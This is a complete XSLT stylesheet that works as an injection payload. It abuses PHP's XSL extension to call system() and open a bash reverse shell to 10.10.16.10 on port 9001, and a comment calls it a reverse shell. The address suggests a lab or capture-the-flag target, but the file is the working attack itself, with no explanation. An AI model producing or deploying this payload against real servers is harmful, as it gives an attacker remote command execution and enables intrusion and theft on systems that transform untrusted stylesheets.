<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="html" indent="yes" />

  <!-- Reverse shell via PHP -->
  <xsl:template match="/">
    <html>
      <body>
        <pre>
          <xsl:value-of select="php:function('system', 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.10/9001 0&gt;&amp;1&quot;')"/>
        </pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
